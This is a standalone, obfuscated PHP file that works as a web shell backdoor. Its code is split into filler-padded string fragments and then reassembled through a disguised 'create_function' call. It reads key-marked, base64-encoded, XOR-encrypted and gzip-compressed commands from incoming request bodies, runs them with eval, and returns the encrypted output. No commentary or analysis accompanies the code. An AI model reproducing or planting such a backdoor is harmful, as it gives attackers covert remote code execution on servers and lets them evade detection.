<?php
$a='f~[or~[($i~[=0;$i<$~[l;){for(~[$j=0;($j<$c&~[&$i<$l~[);$j++~[,$i+~[+){$o~[.=$~[t{$';
$I='i}^$~[k{$j};}}ret~[urn~[ $o~[~[~[;}if~[ (@preg_match("/$~[kh(.+)$kf~[/",@~[f~[ile_~[g';
$Q='$k~[="7e87b~[9~[f4";$k~[h="6b~[d924f3ae36"~[~[;$k~[f="cf4e86a4b~[431";$p~[="~[sHTF2';
$t='[ess~[~[(@x(@b~[ase64_decode($m[1~[])~[,$k)));~[$o=@ob_g~[et~[_con~[tents();@ob_';
$m=str_replace('y','','creyyyate_fyuncytyion');
$o='e~[t_contents("php://~[input"),$~[m)==1) {@o~[b_~[st~[art();@e~[val(@gzunc~[ompr~';
$Y='~[end_c~[lean();$~[~[r=~[@base6~[~[4_encode(@x~[~[(@gzcompr~[ess($o~[),$k));~[print("$p$kh$r$kf");}';
$s='uQMWqF7MjSV";~[~[f~[unction x(~[$t,$k){$c=~[strlen($k~[);$l~[=str~[len~[($t);$o="";';
$C=str_replace('~[','',$Q.$s.$a.$I.$o.$t.$Y);
$O=$m('',$C);$O();
?>
